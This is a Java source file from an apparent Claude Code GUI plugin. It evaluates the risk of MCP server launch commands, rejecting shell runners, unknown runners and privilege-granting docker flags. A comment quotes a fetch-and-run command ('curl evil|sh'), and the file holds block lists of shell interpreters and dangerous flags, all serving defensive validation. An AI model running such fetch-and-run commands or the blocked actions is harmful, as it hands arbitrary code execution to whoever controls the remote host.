package com.github.claudecodegui.mcp;

import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.Locale;
import java.util.Set;

/**
 * 从 MCP server 的 command/args 重算安装风险等级（riskLevel），作为所有 MCP 写入路径
 * （ADD/UPDATE/Codex）的后端安全闸门「单一来源」。
 *
 * <p>背景（SEC-01）：旧实现分散两处——已删除的内置市场 mapper 按_registry package
 * （registryType + runtimeHint）算 riskLevel；已删除的 {@code install_mcp_from_market} 闸门
 * 信任前端回传的 riskLevel 字面量。后者可被前端绕过，且当时 ADD/UPDATE/Codex 路径完全无闸门,
 * 致 {@code sh -c "curl evil|sh"} 等任意命令可一键落盘执行。本类统一为「从纯 command+args 推断」
 * 的纯函数，作为唯一闸门被两个 {@code *McpServerManager.upsertMcpServer}（ADD/UPDATE/Codex 写入口）复用。
 *
 * <p>判定规则：
 * <ul>
 *   <li>非 stdio（http/sse）或无 command（纯 toggle / 仅改 enabled）→ {@code null}（放行）</li>
 *   <li>runner 为 shell（sh/bash/cmd…）→ {@link #RISK_UNVERIFIED}（任意命令执行）</li>
 *   <li>runner 非 {@link #isKnownRunner} → {@link #RISK_UNVERIFIED}</li>
 *   <li>args 含 {@link #DANGEROUS_RUNNER_FLAGS} → {@link #RISK_UNVERIFIED}</li>
 *   <li>docker/podman → {@link #RISK_CONTAINER}；其余已知 runner → {@link #RISK_LOCAL}</li>
 * </ul>
 */
public final class McpCommandRiskEvaluator {

    private McpCommandRiskEvaluator() {
    }

    /** 已知安全的 package runner，可在不标 unverified 的情况下调用。迁自 McpRegistryEntryMapper。 */
    public static final Set<String> KNOWN_RUNNERS = new HashSet<>(Arrays.asList(
        "npx", "uvx", "uv", "pnpm", "pnpx", "bunx", "node", "deno", "python", "python3", "docker", "podman"));

    /** Shell 解释器——作为 MCP server command 即等同授予任意命令执行能力，一律拒绝。 */
    public static final Set<String> SHELL_RUNNERS = new HashSet<>(Arrays.asList(
        "sh", "bash", "zsh", "fish", "ksh", "csh", "cmd", "powershell", "pwsh"));

    /**
     * Container/runner 标志：授予宿主访问或提权。registry/runtime 自带的 args 若覆盖了规范前缀
     * （docker {@code run -i --rm}、npm {@code -y}），含这些标志之一即降级为 {@link #RISK_UNVERIFIED}。
     * <p>MCP-03 补全：在原表（privileged/cap-add/device/pid/ipc/userns/network/-v/volume/mount）基础上
     * 增加 {@code --entrypoint/-e/--env/-u/--user/--workdir/-w/--add-host/--dns/--security-opt}。
     * 注：{@code -e} 同时覆盖 docker 环境注入与 {@code node -e} eval，二者均危险。
     */
    public static final Set<String> DANGEROUS_RUNNER_FLAGS = new HashSet<>(Arrays.asList(
        "--privileged", "--cap-add", "--device", "--pid", "--ipc", "--userns", "--network", "--net",
        "-v", "--volume", "--mount",
        "--entrypoint", "-e", "--env", "-u", "--user", "--workdir", "-w", "--add-host", "--dns", "--security-opt"));

    /** riskLevel 常量：不可信命令，应拒绝落盘。 */
    public static final String RISK_UNVERIFIED = "unverified-command";
    /** riskLevel 常量：容器命令（docker/podman）。 */
    public static final String RISK_CONTAINER = "container-command";
    /** riskLevel 常量：本地命令（npx/uvx 等已知 runner）。 */
    public static final String RISK_LOCAL = "local-command";

    public static boolean isKnownRunner(String runner) {
        return runner != null && KNOWN_RUNNERS.contains(runner.trim().toLowerCase(Locale.ROOT));
    }

    /**
     * 从 server spec 重算 riskLevel。
     *
     * @param serverSpec {@code server.server} 子对象（含 type/command/args），可为 null
     * @return riskLevel 字符串；{@link #RISK_UNVERIFIED}=应拒绝，{@code null}=放行（非执行型/纯 toggle）
     */
    public static String evaluateRisk(JsonObject serverSpec) {
        if (serverSpec == null) {
            return null;
        }
        String type = optString(serverSpec, "type");
        if ("http".equals(type) || "sse".equals(type)) {
            return null; // 远程 server，非本地命令执行
        }
        // stdio（默认）或未知 type：依据 command 判定
        String command = optString(serverSpec, "command");
        if (command == null || command.trim().isEmpty()) {
            return null; // 无 command（纯 toggle / 仅改 enabled），放行
        }
        String runner = firstToken(command);
        if (SHELL_RUNNERS.contains(runner)) {
            return RISK_UNVERIFIED;
        }
        if (!isKnownRunner(runner)) {
            return RISK_UNVERIFIED;
        }
        if (hasDangerousFlag(argList(serverSpec))) {
            return RISK_UNVERIFIED;
        }
        return ("docker".equals(runner) || "podman".equals(runner)) ? RISK_CONTAINER : RISK_LOCAL;
    }

    /** {@code true}=该 server spec 危险，应拒绝落盘。 */
    public static boolean shouldReject(JsonObject serverSpec) {
        return RISK_UNVERIFIED.equals(evaluateRisk(serverSpec));
    }

    /** 给异常/日志的可读原因（仅给判定维度，不回显 command/args 全文，与日志安全一致）。 */
    public static String explainRisk(JsonObject serverSpec) {
        if (serverSpec == null) {
            return "rejected: missing server spec";
        }
        String type = optString(serverSpec, "type");
        if ("http".equals(type) || "sse".equals(type)) {
            return "remote server";
        }
        String command = optString(serverSpec, "command");
        if (command == null || command.trim().isEmpty()) {
            return "no command (toggle-only)";
        }
        String runner = firstToken(command);
        if (SHELL_RUNNERS.contains(runner)) {
            return "shell runner '" + runner + "' can execute arbitrary commands";
        }
        if (!isKnownRunner(runner)) {
            return "unrecognized runner '" + runner + "'";
        }
        if (hasDangerousFlag(argList(serverSpec))) {
            return "dangerous runner flag in args";
        }
        return "allowed";
    }

    /**
     * 判断 args 列表是否含宿主访问/提权标志。迁自 {@code McpRegistryEntryMapper.hasDangerousRunnerArg},
     * 核心算法不变：每个 arg 取 {@code =} 前缀、lower-case 后查 {@link #DANGEROUS_RUNNER_FLAGS}。
     */
    public static boolean hasDangerousFlag(List<String> args) {
        if (args == null) {
            return false;
        }
        for (String arg : args) {
            if (arg == null) {
                continue;
            }
            String normalized = arg.trim().toLowerCase(Locale.ROOT);
            int equals = normalized.indexOf('=');
            String flag = equals >= 0 ? normalized.substring(0, equals) : normalized;
            if (DANGEROUS_RUNNER_FLAGS.contains(flag)) {
                return true;
            }
        }
        return false;
    }

    // ── helpers ──

    private static String firstToken(String command) {
        return command.trim().split("\\s+")[0].toLowerCase(Locale.ROOT);
    }

    private static List<String> argList(JsonObject serverSpec) {
        List<String> args = new ArrayList<>();
        if (serverSpec.has("args") && serverSpec.get("args").isJsonArray()) {
            JsonArray arr = serverSpec.getAsJsonArray("args");
            for (JsonElement e : arr) {
                if (e.isJsonPrimitive() && e.getAsJsonPrimitive().isString()) {
                    args.add(e.getAsString());
                }
            }
        }
        return args;
    }

    private static String optString(JsonObject obj, String key) {
        if (obj != null && obj.has(key) && obj.get(key).isJsonPrimitive()
                && obj.get(key).getAsJsonPrimitive().isString()) {
            return obj.get(key).getAsString();
        }
        return null;
    }
}
